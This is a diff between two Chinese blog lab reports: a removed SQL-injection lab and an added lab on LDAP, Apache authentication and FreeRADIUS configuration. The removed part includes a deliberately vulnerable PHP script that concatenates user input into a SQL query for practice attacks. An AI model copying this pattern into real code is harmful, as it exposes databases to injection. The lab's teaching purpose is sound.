@@ -323,7 +323,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://hmy626.github.io/网络安全实验/网络对抗原理实验一/">
+    <link itemprop="mainEntityOfPage" href="https://hmy626.github.io/网络安全实验/网络对抗原理实验二/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Santu">
@@ -342,7 +342,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/网络安全实验/网络对抗原理实验一/" itemprop="url">网络对抗原理实验一</a></h1>
+                <a class="post-title-link" href="/网络安全实验/网络对抗原理实验二/" itemprop="url">网络对抗原理实验二</a></h1>
         
 
         <div class="post-meta">
@@ -354,7 +354,7 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-13T22:09:22+08:00">
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-13T22:48:57+08:00">
                 2019-01-13
               </time>
             
@@ -370,7 +370,7 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-01-13T22:46:55+08:00">
+              <time title="更新于" itemprop="dateModified" datetime="2019-01-13T22:58:15+08:00">
                 2019-01-13
               </time>
             
@@ -420,7 +420,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  5.5k
+                  2.2k
                 </span>
               
 
@@ -436,7 +436,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  25
+                  8
                 </span>
               
             </div>
@@ -459,420 +459,221 @@
       
         
           
-            <h1 id="网络对抗原理实验一"><a href="#网络对抗原理实验一" class="headerlink" title="网络对抗原理实验一"></a>网络对抗原理实验一</h1><h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><ol>
-<li>搭建mysql数据库，建立数据库test，数据表student，包含id、name、score三列。</li>
-<li>搭建运用的运行环境，如nginx+php-fpm、tomcat+java等等。</li>
-<li>编写带有sql注入漏洞的接口程序，包含:<ul>
-<li>根据输入的参数值，拼接 SQL 查询语句并执行，将查询结果展示。如根据输入的学号展示姓名<br>和分数。</li>
-<li>根据输入的参数值，拼接 SQL 查询语句并执行，展示查询结果是否为空。如输入学号，展示是<br>否有该学生存在。</li>
-<li>根据输入的参数值，拼接 SQL 查询语句并执行，将查询结果是否为空展示在两段随机内容之间。</li>
-<li>根据输入的参数值，拼接 SQL 查询语句并执行，展示查询结果的条件表达式结果，并将结果展<br>示在两段随机内容之间。如入学号，展示该学生分数是否大于 60。</li>
-<li>根据输入的参数值，拼接 SQL 查询语句并执行，但展示一个固定的结果。如输入学号，查询<br>是否有学生存在，然后输出固定内容。</li>
-<li>据输入的参数值，拼接 SQL 语句并执行，更新数据库。如输入学号和分数，将对应学生的分数<br>更新。</li>
-</ul>
-</li>
-<li>针对上述各个应用接口，手工修改请求参数，尝试各种 SQL 注入的攻击向量，和正常访问的对照组一 起，观察结果并记录。</li>
-<li>针对上述各个应用接口，用 sqlmap 尝试各种注入方式，并用 wireshark 抓包，记录每次的目标、 SQL 命令行、结果(包括出结果的过程、和最终的输出)、和抓包文件。</li>
-<li>分析抓包文件，了解攻击向量，体会各种注入技术的原理。并回到 4 步骤中手动尝试。</li>
-<li>在步骤3中第一个接口的基础上，尝试用不同的方法来避免SQL注入，再使用sqlmap尝试看是否有效，能否绕过。</li>
+            <h1 id="网络对抗原理实验二"><a href="#网络对抗原理实验二" class="headerlink" title="网络对抗原理实验二"></a>网络对抗原理实验二</h1><h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><ol>
+<li>用openldap搭建LDAP服务器，尝试对学生信息进行增删改查，信息包括但不限于学生id、密码、 邮箱、手机号、部门等。</li>
+<li>配置 apache 服务器，配置 Basic 认证模块和需要认证的页面，使用用户名密码认证。</li>
+<li>配置 apache 服务器，配置 LDAP 认证模块和需要认证的页面，使用 LDAP 存放的学生的用户名密码<br>认证。</li>
+<li>用freeradius搭建RADIUS服务器，尝试配置基于unix账号的认证，并用radtest验证服务有效。</li>
+<li>配置apache服务器，配置RADIUS认证模块和需要认证的页面，使用unix/Linux本地用户名密码 认证。</li>
+<li>在freeradius中配置ldap认证模块，和LDAP服务器互通，利用ldap账号密码认证用户身份，并用 radtest 测试通过。</li>
 </ol>
-<h2 id="实验环境：Ubuntu-16-04"><a href="#实验环境：Ubuntu-16-04" class="headerlink" title="实验环境：Ubuntu 16.04"></a>实验环境：Ubuntu 16.04</h2><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="搭建mysql数据库，建立数据库test，数据表student，包含id、name、score三列。"><a href="#搭建mysql数据库，建立数据库test，数据表student，包含id、name、score三列。" class="headerlink" title="搭建mysql数据库，建立数据库test，数据表student，包含id、name、score三列。"></a>搭建mysql数据库，建立数据库test，数据表student，包含id、name、score三列。</h3><blockquote>
-<p>进入数据库并且输入密码</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure>
+<h2 id="实验环境：Ubuntu-16-04"><a href="#实验环境：Ubuntu-16-04" class="headerlink" title="实验环境：Ubuntu 16.04"></a>实验环境：Ubuntu 16.04</h2><h2 id="安装并配置ldap"><a href="#安装并配置ldap" class="headerlink" title="安装并配置ldap"></a>安装并配置ldap</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install slapd ldap-utils</span><br><span class="line">sudo dpkg-reconfigure slapd</span><br></pre></td></tr></table></figure>
 <blockquote>
-<p>创建数据库</p>
+<p>Omit OpenLDAP server configuration? =&gt; No</p>
 </blockquote>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> <span class="keyword">test</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="keyword">test</span>;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> student (<span class="keyword">id</span>,<span class="keyword">name</span>,score) <span class="keyword">values</span> (<span class="number">1</span>, <span class="string">'Tom'</span>, <span class="number">95</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> student (<span class="keyword">id</span>,<span class="keyword">name</span>,score) <span class="keyword">values</span> (<span class="number">2</span>, <span class="string">'Jack'</span>, <span class="number">80</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> student (<span class="keyword">id</span>,<span class="keyword">name</span>,score) <span class="keyword">values</span> (<span class="number">3</span>, <span class="string">'Mary'</span>, <span class="number">65</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> student (<span class="keyword">id</span>,<span class="keyword">name</span>,score) <span class="keyword">values</span> (<span class="number">4</span>, <span class="string">'John'</span>, <span class="number">55</span>);</span><br></pre></td></tr></table></figure>
-<h3 id="搭建运用的运行环境-nginx-php-fpm"><a href="#搭建运用的运行环境-nginx-php-fpm" class="headerlink" title="搭建运用的运行环境:nginx+php-fpm"></a>搭建运用的运行环境:nginx+php-fpm</h3><ul>
-<li>在线安装Nginx</li>
+<blockquote>
+<p>DNS domain name? =&gt; example.com</p>
+</blockquote>
+<blockquote>
+<p>Organization name? =&gt; example</p>
+</blockquote>
+<blockquote>
+<p>Administrator password? =&gt; {<strong>**</strong>}</p>
+</blockquote>
+<blockquote>
+<p>Database backend? =&gt; MDB</p>
+</blockquote>
+<blockquote>
+<p>Remove the database when slapd is purged? =&gt; No</p>
+</blockquote>
+<blockquote>
+<p>Move old database? =&gt; Yes</p>
+</blockquote>
+<blockquote>
+<p>Allow LDAPv2 protocol? =&gt; No</p>
+</blockquote>
+<blockquote>
+<p>Done!</p>
+</blockquote>
+<h3 id="防火墙允许通过ldap程序端口"><a href="#防火墙允许通过ldap程序端口" class="headerlink" title="防火墙允许通过ldap程序端口"></a>防火墙允许通过ldap程序端口</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw allow ldap</span><br></pre></td></tr></table></figure>
+<h3 id="测试是否安装成功"><a href="#测试是否安装成功" class="headerlink" title="测试是否安装成功"></a>测试是否安装成功</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapwhoami -H ldap:// -x</span><br></pre></td></tr></table></figure>
+<p>结果如下所示：</p>
+<p><img src="/网络安全实验/网络对抗原理实验二/F3F0911A-4F0D-4962-806C-E06676DFE1C3.png" alt="coin"></p>
+<p>输出为anonymous，所以ldap安装成功。</p>
+<h3 id="配置ldap"><a href="#配置ldap" class="headerlink" title="配置ldap"></a>配置ldap</h3><blockquote>
+<p>新建一个student.ldif写下如下内容</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">dn: ou=student,dc=example,dc=com</span><br><span class="line">objectclass: top</span><br><span class="line">objectclass: organizationalUnit</span><br><span class="line">ou: student</span><br><span class="line"></span><br><span class="line">dn: uid=stu1,ou=student,dc=example,dc=com</span><br><span class="line">objectclass: person</span><br><span class="line">cn: 15069130025</span><br><span class="line">sn: 15069130025</span><br><span class="line">telephonenumber: 18300000000</span><br><span class="line">userPassword: student1</span><br><span class="line">objectclass: organizationalPerson</span><br><span class="line">postalAddress: XD</span><br><span class="line">objectclass: inetOrgPerson</span><br><span class="line">uid: 001</span><br><span class="line"></span><br><span class="line">dn: uid=stu2,ou=student,dc=example,dc=com</span><br><span class="line">objectclass: person</span><br><span class="line">cn: 1234567</span><br><span class="line">sn: 1234567</span><br><span class="line">telephonenumber: 18900000000</span><br><span class="line">userPassword: student2</span><br><span class="line">objectclass: organizationalPerson</span><br></pre></td></tr></table></figure>
+<p><img src="/网络安全实验/网络对抗原理实验二/E59F10B0-B7DB-4B22-B15D-4D2AE0F8F36A.png" alt="coin"></p>
+<h2 id="添加学生信息"><a href="#添加学生信息" class="headerlink" title="添加学生信息"></a>添加学生信息</h2><ul>
+<li>添加学生信息</li>
 </ul>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install nginx</span><br></pre></td></tr></table></figure>
-<p>安装成功之后，nginx放置在/etc/nginx目录下，并且已经在/etc/init.d/下创建了启动脚本；启动程序文件在/usr/sbin/nginx；日志文件放置在/var/log/nginx目录下，分别是access.log和error.log<br>虚拟主机配置文件放置在/etc/nginx/sites-available目录下；默认的虚拟主机的目录/usr/share/nginx/www。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapadd -xWD &apos;cn=admin,dc=example,dc=com&apos; -f student.ldif</span><br></pre></td></tr></table></figure>
 <ul>
-<li>启动Nginx</li>
+<li>查询学生信息</li>
 </ul>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install php7.0-fpm</span><br></pre></td></tr></table></figure>
-<p>在这里，我们使用php-fpm使得PHP7.0可以在nginx上通过PHP-FPM工作，PHP-FPM（FastCGI Process Manager) 是一个守护进程（init脚本文件在/etc/init.d/php7.0-fpm)，它运行了一个FastCGI server，端口是 9000。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -xWD &apos;cn=admin,dc=example,dc=com&apos; -b &apos;uid=stu1,ou=student,dc=example,dc=com&apos;</span><br></pre></td></tr></table></figure>
+<p><img src="/网络安全实验/网络对抗原理实验二/9BB67CE1-F306-4039-9BF2-E3E85C3621FE.png" alt="coin"></p>
+<h2 id="安装与配置apache服务器"><a href="#安装与配置apache服务器" class="headerlink" title="安装与配置apache服务器"></a>安装与配置apache服务器</h2><ul>
+<li>安装</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install apache2 apache2-dev</span><br><span class="line">sudo service apache2 restart</span><br><span class="line">sudo ufw allow in &quot;Apache Full&quot;</span><br></pre></td></tr></table></figure>
 <ul>
-<li>配置Nginx</li>
+<li>配置Basic认证</li>
 </ul>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/nginx/sites-available/default</span><br></pre></td></tr></table></figure>
-<p><img src="/网络安全实验/网络对抗原理实验一/1.png" alt=""></p>
-<p>将配置文件中将第39行添加index.htm和index.php使.htm文件和php文件可以成为文件夹默认打开文件，并且反注释57行进行9000端口监听。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/apache2/sites-enabled/000-default.conf</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>配置如下所示</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory /var/www/html&gt;</span><br><span class="line">	Options Indexes FollowSymLinks</span><br><span class="line">	AllowOverride authconfig</span><br><span class="line">	Order allow,deny</span><br><span class="line">	allow from all</span><br><span class="line">	AuthType Basic</span><br><span class="line">	AuthName &apos;santu&apos;</span><br><span class="line">	AuthBasicProvider file</span><br><span class="line">	AuthUserFile /var/www/html/.valid_user</span><br><span class="line">	Require valid-user</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/网络安全实验/网络对抗原理实验二/EECCDE52-600D-4D75-8227-6FCC2DE943FA.png" alt="coin"></p>
+<blockquote>
+<p><strong>这里的注释是一会儿配置ldap时需要用到的</strong></p>
+</blockquote>
+<blockquote>
+<p><strong>建立basic认证的密钥文件</strong></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo htpasswd -bc /var/www/html/.valid_user santu &#123;[PASSWD]&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>然后访问web</p>
+</blockquote>
+<p><img src="/网络安全实验/网络对抗原理实验二/E932B380-12F1-4B1F-BC8B-4214DDA0A7B9.png" alt="coin"></p>
+<h2 id="配置apache使用ldap认证"><a href="#配置apache使用ldap认证" class="headerlink" title="配置apache使用ldap认证"></a>配置apache使用ldap认证</h2><blockquote>
+<p>修改apache2.conf</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/apache2/apache2.conf</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>在apache2.conf文件开头中添加这一行导入模块</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Include mods-available/ldap.*</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>重启apache服务器，加载模块</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo service apache2 restart</span><br><span class="line">a2enmod ldap</span><br><span class="line">a2enmod authnz_ldap</span><br><span class="line">sudo service apache2 restart</span><br></pre></td></tr></table></figure>
+<p>我这里已经加载了<br><img src="/网络安全实验/网络对抗原理实验二/3D5F049E-2D23-45D3-9EA4-9C839675C189.png" alt="coin"></p>
+<blockquote>
+<p>接着，修改000-default.conf(就是上文中提到的那个注释),我这里选择这里选择注释掉AuthUserFile密钥文件，如果以后需要恢复basic认证时只需取消注释，并且将AuthBasicProvider后改为file即可</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory /var/www/html&gt;</span><br><span class="line">	Options Indexes FollowSymLinks</span><br><span class="line">	AllowOverride authconfig</span><br><span class="line">	Order allow,deny</span><br><span class="line">	allow from all</span><br><span class="line">	AuthType Basic</span><br><span class="line">	AuthName &apos;santu&apos;</span><br><span class="line">	AuthBasicProvider ldap</span><br><span class="line">	#AuthUserFile /var/www/html/.valid_user</span><br><span class="line">	AuthLDAPURL ldap://127.0.0.1/ou=student,dc=example,dc=com?uid</span><br><span class="line">	Require valid-user</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/网络安全实验/网络对抗原理实验二/CC055D81-8C43-41AD-B539-E60A03FA1337.png" alt="coin"></p>
+<blockquote>
+<p>重启服务器</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service apache2 restart</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>现在，就可以用student.ldif中的学生信息进行登录验证了</p>
+</blockquote>
+<p><img src="/网络安全实验/网络对抗原理实验二/09157948-F2BB-49B1-94C0-71C5AB30DE0F.png" alt="coin"></p>
+<h2 id="apache使用freeradius认证"><a href="#apache使用freeradius认证" class="headerlink" title="apache使用freeradius认证"></a>apache使用freeradius认证</h2><ul>
+<li>安装freeradius之前先要确保已经安装了mysql、因为后来要用到、没有安装使用apt-get来安装</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install mysql-server</span><br></pre></td></tr></table></figure>
 <ul>
-<li>reload使配置生效</li>
+<li>安装freeradius的部件</li>
 </ul>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service nginx restart</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install libssl-dev libapache2-mod-auth-radius freeradius freeradius-ldap mysql-server freeradius-mysql</span><br></pre></td></tr></table></figure>
 <ul>
-<li>测试<blockquote>
-<p>在网站根目录创建一个PHP的测试文件</p>
-</blockquote>
-</li>
+<li>安装完成后freeradius就会自动启动了、由于我们要使用调试模式来启动freeradius、所以先关闭freeradius服务</li>
 </ul>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /var/www/html/info.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service freeradius stop</span><br></pre></td></tr></table></figure>
+<ul>
+<li>修改/etc/freeradius/下的users文件</li>
+</ul>
+<p><img src="/网络安全实验/网络对抗原理实验二/a.png" alt="coin"></p>
+<p>把这几行反注释、也就是使用一个名为steve、密码为testing的用户来测试一下是否通则登录freeradius服务器、保存后退出然后启动radius的调试模式。</p>
+<p><strong>注意点一</strong>：这里需要补充一点使用ubtuntu的apt-get方式来安装freeradius的位置会和源码不同、源码安装的默认位置是/usr/local/etc/raddb/而使用ubuntu的apt-get方式的配置文件则安置在/etc/freeradius/，我这里是使用apt-get来安装的，所以默认安装位置为/etc/freeradius/</p>
+<ul>
+<li>开启调试模式</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">freeradius –X</span><br></pre></td></tr></table></figure>
+<p><img src="/网络安全实验/网络对抗原理实验二/b.png" alt="coin"></p>
+<ul>
+<li>然后打开另一个终端、使用radtest来测试用户是否能够通过</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">radtest steve testing localhost 1812 testing123</span><br></pre></td></tr></table></figure>
+<p>注意点：这里的测试就是上述的users文件里面默认的用户名和密码，只在还没启动mysql之前测试有效，而因为我已经启用了mysql中我自己的用户，所以这个就无效了。<br>这句前steve和testing代表用户和密码、localhost和1812则是freeradius的IP地址和端口号、testing123则是freeradius服务端与客户端之间通讯的key、由/etc/freeradius目录下的clients.conf定义、在client localhost字段的secret参数。<br>radtest成功通过后则会显示Access-Accept状态。另外，如果你一个不好运、确实在linux系统中存在steve的用户、这样子的话freeradius服务器则会跳过你现在的用户配置直接去查询系统的配置、这时的密码就会以系统密码为准、这里在users文件中定义的密码就会失效、而且如果改用户是禁止在linux上登录的话、则会直接把用户打回成 Access-Reject</p>
+<ul>
+<li>以下是我在mysql中创建了santu用户（下面会说）之后成功的验证</li>
+</ul>
+<p><img src="/网络安全实验/网络对抗原理实验二/c.png" alt="coin"></p>
+<ul>
+<li>服务器端代码为</li>
+</ul>
+<p><img src="/网络安全实验/网络对抗原理实验二/d.png" alt="coin"><br><img src="/网络安全实验/网络对抗原理实验二/e.png" alt="coin"><br><img src="/网络安全实验/网络对抗原理实验二/f.png" alt="coin"></p>
+<ul>
+<li>mysql与freeradius连接</li>
+</ul>
 <blockquote>
-<p>php文件内容</p>
+<p>建立radius数据库</p>
 </blockquote>
-<p><img src="/网络安全实验/网络对抗原理实验一/2.png" alt=""></p>
+<p><img src="/网络安全实验/网络对抗原理实验二/g.png" alt="coin"></p>
 <blockquote>
-<p>打开浏览器输入<a href="http://127.0.0.1/info.php" target="_blank" rel="noopener">http://127.0.0.1/info.php</a></p>
+<p>然后建立radius数据库</p>
 </blockquote>
-<p><img src="/网络安全实验/网络对抗原理实验一/3.png" alt="coin"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create database radius;</span><br></pre></td></tr></table></figure>
 <blockquote>
-<p>至此nginx已经配置成功</p>
+<p>之后使用exit退出mysql、然后建立一系统的表格、freeradius已经自带有sql脚本、我们执行这些脚本就可以自行建立了，首先定位到这些脚本所在目录</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/freeradius/sql/mysql</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>导入admin.sql</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p[PASSWORD] radius &lt; admin.sql</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>schema.sql同样也是照此格式来执行导入到数据库，如果结果正常的话，可以使用radius账户进入mysql数据库</p>
+</blockquote>
+<p><img src="/网络安全实验/网络对抗原理实验二/h.png" alt="coin"></p>
+<p>这里默认密码为radpass<br>这样我们就可以看到一些tables了</p>
+<blockquote>
+<p>配置freeradius</p>
 </blockquote>
 <ul>
-<li>配置php-fpm</li>
+<li>修改/etc/freeradius/radiusd.conf 定位到该行</li>
 </ul>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install php7.0-mysql php7.0-curl php7.0-gd php7.0-intl php-pear php7.0-imagick php7.0-imap php7.0-mcrypt php7.0-memcache php7.0-ming php7.0-ps php7.0-pspell php7.0-recode php7.0-snmp php7.0-sqlite php7.0-tidy php7.0-xmlrpc php7.0-xsl</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>重启PHP-FPM，使之生效</p>
-</blockquote>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service php7.0-fpm restart</span><br></pre></td></tr></table></figure>
-<h3 id="编写带有sql注入漏洞的接口程序"><a href="#编写带有sql注入漏洞的接口程序" class="headerlink" title="编写带有sql注入漏洞的接口程序"></a>编写带有sql注入漏洞的接口程序</h3><blockquote>
-<p>以下代码中数据库密码[<strong>**</strong>]已作脱敏处理，应换成你的mysql root密码</p>
-</blockquote>
+<p><img src="/网络安全实验/网络对抗原理实验二/i.png" alt="coin"></p>
+<p>将其反注释，启动sql.conf</p>
 <ul>
-<li>根据输入的参数值，拼接 SQL 查询语句并执行，将查询结果展示。如根据输入的学号展示姓名和分数。</li>
+<li>然后编辑/etc/freeradius/sql.conf</li>
 </ul>
-<p>html文件如下</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">head</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">title</span>&gt;</span>GET sql injection<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"./1.php"</span> <span class="attr">method</span>=<span class="string">"GET"</span>&gt;</span></span><br><span class="line">                        student id:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"id"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/网络安全实验/网络对抗原理实验一/a.png" alt="coin"></p>
-<p>php文件如下所示</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">        $id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">        $con=mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">'&#123;********&#125;'</span>);</span><br><span class="line">        <span class="keyword">if</span>($con)&#123;</span><br><span class="line">                mysqli_select_db($con,<span class="string">'test'</span>);</span><br><span class="line">                $query=mysqli_query($con,<span class="string">"SELECT name,score FROM student WHERE id='$id';"</span>);</span><br><span class="line">                $num=mysqli_num_rows($query);</span><br><span class="line">                $i=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span>($i&lt;$num)&#123;</span><br><span class="line">                        $result=mysqli_fetch_assoc($query);</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"name:"</span>.$result[<span class="string">"name"</span>].<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"score:"</span>.$result[<span class="string">"score"</span>].<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">                        $i++;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close($con);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/网络安全实验/网络对抗原理实验一/b.png" alt="coin"></p>
